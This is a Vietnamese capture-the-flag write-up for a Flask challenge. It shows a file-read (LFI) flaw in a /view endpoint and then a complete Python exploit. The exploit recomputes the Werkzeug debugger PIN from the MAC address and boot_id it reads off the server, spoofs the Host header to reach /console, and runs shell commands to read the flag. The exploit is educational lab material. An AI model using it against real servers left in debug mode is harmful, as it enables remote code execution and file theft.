<img width="1495" height="704" alt="image" src="https://github.com/user-attachments/assets/525a815b-1719-4050-8b0b-6a296ac7d931" />


Mở source code lên xem, ta thấy ở function view(), lỗ hổng LFI, cho phép đọc file của sever.


```python
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def hello_world():
    return render_template('index.html')

@app.route('/view')
def view():
    filename = request.args.get('filename')
    if not filename:
        return "Filename is required", 400
    try:
        with open(filename, 'r') as file:
            content = file.read()
        return content, 200
    except FileNotFoundError:
        return "File not found", 404
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```
Tiếp đến, ta check file docker. Chú ý thấy tên file flag.txt đã được di chuyển sang thư mục `/` và bị đổi tên thành flag-<32 ký tự random>.txt đồng thời giới hạn quyền truy cập
```docker
RUN mv flag.txt /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt && \
    chown -R nobody:nogroup /app
```
Mặc dù có LFI nhưng vì ko thể nào đoán được tên file flag, nên ta phải tìm cách khác. Chú ý thấy trong đoạn source code, chế độ debug đã được bật. 

Khi chạy Flask app với `debug=True`, framwork **Werkzeug** ( thư viện đứng sau Flask ) sẽ bật một **interactive debugger**. Debugger này có giao diện web, tồn tại một enpoint `/console`, khi nhập đúng mã pin và bypass, nó sẽ trở thành một Python shell trên sever.

Cách tính PIN
----------------------------------
**Werkzeug** tạo PIN bằng SHA1 của:
- username (`nobody`)
- module name (`flask.app`)
- class name (`Flask`)
- đường dẫn file Flask (`usr/local/lib/python3.11/site-packages/flask/app.py`)
- MAC address ( từ `/sys/class/net/eth0/address`)
- bootid ( từ `/proc/sys/kernel/random/boot_id`)

Rồi thêm salt -> tạo chuỗi PIN.

Lợi dụng lỗ hổng LFI sẵn có, ta đọc được file rồi tính mã PIN. 

Lấy secret
--
Truy cập trực tiếp `/console ` thường bị chặn (host check), có thể bypass bằng header. 
Trang trả về một JS snipper có chứa biến SECRET=""

Xác thực PIN
-
- Gửi pin đến endpoint `/console>_debugger__=yes&cmd=pinauth`
- Nếu đúng -> nhận cookie `__wzd...` cho phiên debug

Code Exploit
-
```python
from requests import get
import hashlib
from itertools import chain
import re

HOST = "https://my-flask-app.chals.sekai.team:1337"

#Lấy content của file
def getfile(filename):
    try:
        response = get(f"{HOST}/view?filename={filename}")
        return response.text
    except Exception as e:
        print(f"Error{e}")
        return None

#code generate mã PIN của thư viện
def get_pin(probaly_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probaly_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    
    cookie_name = '__wzd' + h.hexdigest()[:20]
    
    num = None
    if num is None:
        if num is None:
            h.update(b'pinsalt')
            num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

def get_secret():
    #
    response = get(f"{HOST}/console", headers={"Host": "127.0.0.1"})
    match = re.search(r'SECRET\s*=\s*["\']([^"\']+)["\']', response.text)

    if match:
        return match.group(1)
    return None

def authenticate(secret, pin):
    response = get(f"{HOST}/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}", headers={"Host": "127.0.0.1"})
    return response.headers.get("Set-Cookie")

def execute_code(cookie, code, secret):
    response = get(f"{HOST}/console?__debugger__=yes&cmd={code}&frm=0&s={secret}", headers={"Host": "127.0.0.1", "Cookie": cookie})
    return response.text

if __name__ == "__main__":

    mac = getfile("/sys/class/net/eth0/address")
    mac = str(int("0x" + "".join(mac.split(":")).strip(), 16))
    boot_id = getfile("/proc/sys/kernel/random/boot_id").strip()
    
    # should be default
    probably_public_bits = [
        'nobody',
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.11/site-packages/flask/app.py' # change this to the path of the flask app
    ]

    private_bits = [
        mac,
        boot_id
    ]

    print("Found Console PIN: ", get_pin(probably_public_bits, private_bits))

    secret = get_secret()
    print("Found Secret: ", secret)

    cookie = authenticate(secret, get_pin(probably_public_bits, private_bits))
    print("Found Cookie: ", cookie)

    print("Executing code...")

    output = execute_code(cookie, "__import__('os').popen('cat /flag*').read()", secret)
    
    match = re.search(r'SEKAI\{.*\}', output)
    if match:
        print("Found flag: ", match.group(0))
    else:
        print("No flag found")

    print("Done")
```

